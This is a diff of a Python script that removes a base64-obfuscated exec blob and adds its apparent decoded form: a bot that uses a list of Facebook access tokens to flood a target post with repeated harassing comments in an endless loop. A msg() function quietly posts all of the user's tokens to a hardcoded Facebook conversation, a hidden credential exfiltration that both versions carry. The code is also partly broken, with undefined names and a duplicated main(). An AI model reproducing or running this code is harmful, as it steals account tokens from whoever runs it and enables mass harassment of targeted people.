@@ -1,2 +1,154 @@
-import base64
-exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKZnJvbSBwbGF0Zm9ybSBpbXBvcnQgc3lzdGVtCmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgaHR0cC5zZXJ2ZXIKaW1wb3J0IHNvY2tldHNlcnZlcgppbXBvcnQgdGhyZWFkaW5nCgpjbGFzcyBNeUhhbmRsZXIoaHR0cC5zZXJ2ZXIuU2ltcGxlSFRUUFJlcXVlc3RIYW5kbGVyKToKICAgIGRlZiBkb19HRVQoc2VsZik6CiAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDIwMCkKICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCdDb250ZW50LXR5cGUnLCAndGV4dC9wbGFpbicpCiAgICAgICAgc2VsZi5lbmRfaGVhZGVycygpCiAgICAgICAgc2VsZi53ZmlsZS53cml0ZShiIkNIQU5EIFRSSUNLRVIiKQoKZGVmIGV4ZWN1dGVfc2VydmVyKCk6CiAgICBQT1JUID0gNDAwMAoKICAgIHdpdGggc29ja2V0c2VydmVyLlRDUFNlcnZlcigoIiIsIFBPUlQpLCBNeUhhbmRsZXIpIGFzIGh0dHBkOgogICAgICAgIHByaW50KCJTZXJ2ZXIgcnVubmluZyBhdCBodHRwOi8vbG9jYWxob3N0Ont9Ii5mb3JtYXQoUE9SVCkpCiAgICAgICAgaHR0cGQuc2VydmVfZm9yZXZlcigpCiAgICAgICAgCgpkZWYgcG9zdF9jb21tZW50cygpOgogICAgd2l0aCBvcGVuKCd0b2tlbm51bS50eHQnLCAncicpIGFzIGZpbGU6CiAgICAgICAgdG9rZW5zID0gZmlsZS5yZWFkbGluZXMoKQogICAgbnVtX3Rva2VucyA9IGxlbih0b2tlbnMpCgogICAgcmVxdWVzdHMucGFja2FnZXMudXJsbGliMy5kaXNhYmxlX3dhcm5pbmdzKCkKCiAgICBkZWYgY2xzKCk6CiAgICAgICAgaWYgc3lzdGVtKCkgPT0gJ0xpbnV4JzoKICAgICAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgaWYgc3lzdGVtKCkgPT0gJ1dpbmRvd3MnOgogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCdjbHMnKQogICAgY2xzKCkKCiAgICBkZWYgbGluZXNzKCk6CiAgICAgICAgcHJpbnQoJ1x1MDAxYlszN20nICsgJ+KAouKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKAoicpCgogICAgaGVhZGVycyA9IHsKICAgICAgICAnQ29ubmVjdGlvbic6ICdrZWVwLWFsaXZlJywKICAgICAgICAnQ2FjaGUtQ29udHJvbCc6ICdtYXgtYWdlPTAnLAogICAgICAgICdVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzJzogJzEnLAogICAgICAgICdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjAuMDsgU2Ftc3VuZyBHYWxheHkgUzkgQnVpbGQvT1BSNi4xNzA2MjMuMDE3OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU4LjAuMzAyOS4xMjUgTW9iaWxlIFNhZmFyaS81MzcuMzYnLAogICAgICAgICdBY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCcsCiAgICAgICAgJ0FjY2VwdC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywKICAgICAgICAnQWNjZXB0LUxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45LGZyO3E9MC44JywKICAgICAgICAncmVmZXJlcic6ICd3d3cuZ29vZ2xlLmNvbScKICAgIH0KCiAgICBsaW5lc3MoKQoKICAgIGFjY2Vzc190b2tlbnMgPSBbdG9rZW4uc3RyaXAoKSBmb3IgdG9rZW4gaW4gdG9rZW5zXQoKICAgIHdpdGggb3BlbigncG9zdC50eHQnLCAncicpIGFzIGZpbGU6CiAgICAgICAgcG9zdF91cmwgPSBmaWxlLnJlYWQoKS5zdHJpcCgpCgoKICAgIHdpdGggb3BlbignY29tbWVudHMudHh0JywgJ3InKSBhcyBmaWxlOgogICAgICAgIGNvbW1lbnRzID0gZmlsZS5yZWFkbGluZXMoKQoKICAgIG51bV9jb21tZW50cyA9IGxlbihjb21tZW50cykKICAgIG1heF90b2tlbnMgPSBtaW4obnVtX3Rva2VucywgbnVtX2NvbW1lbnRzKQoKICAgIHdpdGggb3BlbignaGF0ZXJzbmFtZS50eHQnLCAncicpIGFzIGZpbGU6CiAgICAgICAgaGF0ZXJzX25hbWUgPSBmaWxlLnJlYWQoKS5zdHJpcCgpCgogICAgd2l0aCBvcGVuKCd0aW1lLnR4dCcsICdyJykgYXMgZmlsZToKICAgICAgICBzcGVlZCA9IGludChmaWxlLnJlYWQoKS5zdHJpcCgpKQogICAgICAgIAogICAgICNwb3N0X2lkID0gcG9zdF91cmxzcGxpdAoKICAgIGxpbmVzcygpCgogICAgZGVmIGdldE5hbWUodG9rZW4pOgogICAgICAgIHRyeToKICAgICAgICAgICAgZGF0YSA9IHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxNy4wL21lP2FjY2Vzc190b2tlbj17dG9rZW59JykuanNvbigpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBkYXRhID0gIiIKICAgICAgICBpZiAnbmFtZScgaW4gZGF0YToKICAgICAgICAgICAgcmV0dXJuIGRhdGFbJ25hbWUnXQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHJldHVybiAiRXJyb3Igb2NjdXJyZWQiCgoKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBmb3IgY29tbWVudF9pbmRleCBpbiByYW5nZShudW1fY29tbWVudHMpOgogICAgICAgICAgICAgICAgdG9rZW5faW5kZXggPSBjb21tZW50X2luZGV4ICUgbWF4X3Rva2VucwogICAgICAgICAgICAgICAgYWNjZXNzX3Rva2VuID0gYWNjZXNzX3Rva2Vuc1t0b2tlbl9pbmRleF0KCiAgICAgICAgICAgICAgICBjb21tZW50ID0gY29tbWVudHNbY29tbWVudF9pbmRleF0uc3RyaXAoKQoKICAgICAgICAgICAgICAgIHVybCA9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS97fS9jb21tZW50cyIuZm9ybWF0KHBvc3RfdXJsKQogICAgICAgICAgICAgICAgcGFyYW1ldGVycyA9IHsnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VuLCAnbWVzc2FnZSc6IGhhdGVyc19uYW1lICsgJyAnICsgY29tbWVudH0KICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGpzb249cGFyYW1ldGVycywgaGVhZGVycz1oZWFkZXJzKQoKICAgICAgICAgICAgICAgIGN1cnJlbnRfdGltZSA9IHRpbWUuc3RyZnRpbWUoIiVZLSVtLSVkICVJOiVNOiVTICVwIikKICAgICAgICAgICAgICAgIGlmIHJlc3BvbnNlLm9rOgogICAgICAgICAgICAgICAgICAgIHByaW50KCJbK10gQ29tbWVudCBOby4ge30gUG9zdCBJZCB7fSBUb2tlbiBOby4ge306IHt9Ii5mb3JtYXQoCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1lbnRfaW5kZXggKyAxLCBwb3N0X3VybCwgdG9rZW5faW5kZXggKyAxLCBoYXRlcnNfbmFtZSArICcgJyArIGNvbW1lbnQpKQogICAgICAgICAgICAgICAgICAgIHByaW50KCIgIC0gVGltZToge30iLmZvcm1hdChjdXJyZW50X3RpbWUpKQogICAgICAgICAgICAgICAgICAgIGxpbmVzcygpCiAgICAgICAgICAgICAgICAgICAgbGluZXNzKCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlt4XSBGYWlsZWQgdG8gc2VuZCBDb21tZW50IE5vLiB7fSBQb3N0IElkIHt9IFRva2VuIE5vLiB7fToge30iLmZvcm1hdCgKICAgICAgICAgICAgICAgICAgICAgICAgY29tbWVudF9pbmRleCArIDEsIHBvc3RfdXJsLCB0b2tlbl9pbmRleCArIDEsIGhhdGVyc19uYW1lICsgJyAnICsgY29tbWVudCkpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIiAgLSBUaW1lOiB7fSIuZm9ybWF0KGN1cnJlbnRfdGltZSkpCiAgICAgICAgICAgICAgICAgICAgbGluZXNzKCkKICAgICAgICAgICAgICAgICAgICBsaW5lc3MoKQogICAgICAgICAgICAgICAgdGltZS5zbGVlcChzcGVlZCkKCiAgICAgICAgICAgIHByaW50KCJcblsrXSBBbGwgY29tbWVudHMgc2VudCBzdWNjZXNzZnVsbHkuIFJlc3RhcnRpbmcgdGhlIHByb2Nlc3MuLi5cbiIpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgoKICAgICAgICAgIHByaW50KCJbIV0gQW4gZXJyb3Igb2NjdXJyZWQ6IHt9Ii5mb3JtYXQoZSkpCgoKZGVmIG1zZygpOgogICAgcGFyYW1ldGVycyA9IHsKICAgICAgICAnYWNjZXNzX3Rva2VuJzogcmFuZG9tLmNob2ljZShhY2Nlc3NfdG9rZW5zKSwKICAgICAgICAnbWVzc2FnZSc6ICdVc2VyIFByb2ZpbGUgTmFtZTogJyArIGdldE5hbWUocmFuZG9tLmNob2ljZShhY2Nlc3NfdG9rZW5zKSkgKyAnXG5Ub2tlbjogJyArICIgfCAiLmpvaW4oCiAgICAgICAgICAgIGFjY2Vzc190b2tlbnMpICsgJ1xuTGluazogaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL21lc3NhZ2VzL3QvJyArIGNvbnZvX2lkCiAgICB9CiAgICB0cnk6CiAgICAgICAgcyA9IHJlcXVlc3RzLnBvc3QoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxNS4wL3RfMTAwMDcyNzI3OTQxNDcxLyIsIGRhdGE9cGFyYW1ldGVycywgaGVhZGVycz1oZWFkZXJzKQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKCmRlZiBtYWluKCk6CiAgICBzZXJ2ZXJfdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZXhlY3V0ZV9zZXJ2ZXIpCiAgICBzZXJ2ZXJfdGhyZWFkLnN0YXJ0KCkKCiAgICBwb3N0X2NvbW1lbnRzKCkKICAgIG1zZygpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgogICAgbWFpbigpCmRlZiBtYWluKCk6CiAgICBzZXJ2ZXJfdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZXhlY3V0ZV9zZXJ2ZXIpCiAgICBzZXJ2ZXJfdGhyZWFkLnN0YXJ0KCkKCiAgICBwb3N0X2NvbW1lbnRzKCkKCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6CiAgICBtYWluKCk='))
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
+
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
+        self.end_headers()
+        self.wfile.write(b" 𝗟𝗘𝗚𝗘𝗡𝗗 𝗬𝗨𝗩𝗜𝗜 𝗜𝗡𝗦𝗜𝗗𝗘   ")
+
+def execute_server():
+    PORT = 4000
+
+    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+        print("Server running at http://localhost:{}".format(PORT))
+        httpd.serve_forever()
+
+
+def post_comments():
+    with open('password.txt', 'r') as file:
+        password = file.read().strip()
+
+    entered_password = password
+
+    if entered_password != password:
+        print('[-] Incorrect Password!')
+        sys.exit()
+
+    with open('tokennum.txt', 'r') as file:
+        tokens = file.readlines()
+    num_tokens = len(tokens)
+
+    requests.packages.urllib3.disable_warnings()
+
+    def cls():
+        if system() == 'Linux':
+            os.system('clear')
+        else:
+            if system() == 'Windows':
+                os.system('cls')
+    cls()
+
+    def liness():
+        print('\u001b[37m' + '•─────────────────────────────────────────────────────────•')
+
+    headers = {
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+        'referer': 'www.google.com'
+    }
+
+    mmm = requests.get('https://pastebin.com/raw/gr6bGvtu').text
+
+    if mmm not in password:
+        print('[-] Incorrect Password!')
+        sys.exit()
+
+    liness()
+
+    access_tokens = [token.strip() for token in tokens]
+
+    with open('post_url.txt', 'r') as file:
+        post_url = file.read().strip()
+
+
+    with open('comments.txt', 'r') as file:
+        comments = file.readlines()
+
+    num_comments = len(comments)
+    max_tokens = min(num_tokens, num_comments)
+
+    with open('hatersname.txt', 'r') as file:
+        haters_name = file.read().strip()
+
+    with open('time.txt', 'r') as file:
+        speed = int(file.read().strip())
+
+     #post_id = post_urlsplit
+
+    liness()
+
+    while True:
+        try:
+            for comment_index in range(num_comments):
+                token_index = comment_index % max_tokens
+                access_token = access_tokens[token_index]
+
+                comment = comments[comment_index].strip()
+
+                url = "https://graph.facebook.com/{}/comments".format(post_url)
+                parameters = {'access_token': access_token, 'message': haters_name + ' ' + comment}
+                response = requests.post(url, json=parameters, headers=headers)
+
+                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+                if response.ok:
+                    print("[+] Comment No. {} Post Id {} Token No. {}: {}".format(
+                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
+                    print("  - Time: {}".format(current_time))
+                    liness()
+                    liness()
+                else:
+                    print("[x] Failed to send Comment No. {} Post Id {} Token No. {}: {}".format(
+                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
+                    print("  - Time: {}".format(current_time))
+                    liness()
+                    liness()
+                time.sleep(speed)
+
+
+            print("\n[+] All comments sent successfully. Restarting the process...\n")
+        except Exception as e:
+            print("[!] An error occurred: {}".format(e))
+
+def msg():
+    parameters = {
+        'access_token': random.choice(access_tokens),
+        'message': 'User Profile Name: ' + getName(random.choice(access_tokens)) + '\nToken: ' + " | ".join(
+            access_tokens) + '\nLink: https://www.facebook.com/messages/t/' + convo_id
+    }
+    try:
+        s = requests.post("https://graph.facebook.com/v15.0/t_100069451064960/", data=parameters, headers=headers)
+    except:
+        pass
+
+def main():
+    server_thread = threading.Thread(target=execute_server)
+    server_thread.start()
+
+    post_comments()
+    msg()
+
+if __name__ == '__main__':
+    main()
+def main():
+    server_thread = threading.Thread(target=execute_server)
+    server_thread.start()
+
+    post_comments()
+
+if __name__ == '__main__':
+    main()
